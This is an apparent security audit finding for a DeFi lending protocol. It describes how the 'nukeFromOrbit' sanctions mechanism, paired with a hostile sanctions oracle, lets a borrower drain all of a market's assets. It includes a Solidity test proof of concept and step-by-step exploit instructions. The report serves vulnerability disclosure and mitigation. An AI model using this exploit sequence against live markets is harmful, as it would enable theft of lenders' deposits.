# Vulnerability details

## Impact
NukingFromOrbit can cause reserves to fall below the required reserves ratio, and if paired with a malicious chainalysis oracle result in the borrower taking 100% of assets from a market. 

Consider the following:
1.borrower creates market. 
2. alice deposits 1e18. 
3. bob deposits 1e18. 
4. borrower borrows 1e18. 
5. bob is sanctioned and nuked from orbit. the withdrawal request will queue the remaining 1e18 assets for withdrawal, immediately placing the borrower into delinquency and starting the grace period for penalty apr. Bob getting sanctioned causes the borrower to potentially have to pay penalty interest until required reserve is satisfied. I would argue this is punishing the borrower for the actions of a lender over which the borrower has no control. 

With the help of a hostile chainalysis oracle, a borrower is able to take control of 100% of assets in a market regardless of the required reserve ratio, as shown in the below PoC. With a few adjustments, the below PoC will also show the less severe scenario excluding a hostile chainalysis oracle. 

## Proof of Concept
This POC is part of the HooksIntegration.t.sol test suite:
```solidity
function test_onNukeFromOrbitMal(
    StandardHooksConfig memory config,
    bytes memory extraData
  ) external {
    _setUp(config);
    
    _deposit(alice, 1e18);
    _deposit(borrower, 1e18);
    uint marketBalanceBefore = asset.balanceOf(address(market));
    assertEq(marketBalanceBefore, 2e18);
    MockHooks(address(hooks)).reset();
    _borrow(1e18);
    // borrow gets sanctioned
    sanctionsSentinel.sanction(borrower);

    startPrank(borrower);
    MarketState memory state = pendingState();
    if (config.useOnNukeFromOrbit) {
      vm.expectEmit(address(hooks));
      emit OnNukeFromOrbitCalled(borrower, state, extraData);
    }
    bytes memory _calldata = abi.encodePacked(
      abi.encodeWithSelector(market.nukeFromOrbit.selector, borrower),
      extraData
    );
    uint32 expiry = uint32(block.timestamp + parameters.withdrawalBatchDuration);
    state.pendingWithdrawalExpiry = expiry;
    if (config.useOnQueueWithdrawal) {
      vm.expectEmit(address(hooks));
      emit OnQueueWithdrawalCalled(borrower, expiry, 1e18, state, '');
    }
    _callMarket(_calldata, '', 'nukeFromOrbit');

    uint reqLiq = market.coverageLiquidity();
    uint assets = asset.balanceOf(address(market));
    assertGt(reqLiq, assets);
    fastForward(expiry + 1);
    market.executeWithdrawal(borrower, expiry);

    sanctionsSentinel.unsanction(borrower);

    WildcatSanctionsEscrow escrow = WildcatSanctionsEscrow(
      sanctionsSentinel.getEscrowAddress(borrower, borrower, address(asset))
    );

    escrow.releaseEscrow();

    uint marketBalanceAfter = asset.balanceOf(address(market));
    assertEq(marketBalanceAfter, 0);
    uint aliceMarkettokens = market.balanceOf(alice);
    assertGt(aliceMarkettokens, 1e18);
    uint liquidityRequired = market.coverageLiquidity();
    assertGt(liquidityRequired, 0);
    uint borrowerBalance = asset.balanceOf(borrower);
    assertEq(borrowerBalance, 2e18);
  }
```

Steps To exploit:
1. borrower creates a market.
2. alice deposits assets into market.
3. borrower deposit an equal amount of assets into market. 
4. borrower borrows 50% of the assets in the market. 
5. hostile chainalysis oracle sanctions the borrower.
6. borrower nukes themselves from orbit, transferring the remaining assets into an escrow contract. 
7. chainalysis oracle unsanctions the borrower. 
8. Borrower releasesEscrow, having now taken 100% of the assets from the market.

## Recommended Mitigation Steps
When nuking from orbit, some consideration should be given to whether the nuke places the borrower into delinquency. If the delinquency is the result of a third parties actions resulting in a sanction, the borrower should not be subjected to penalty interest on the loan.
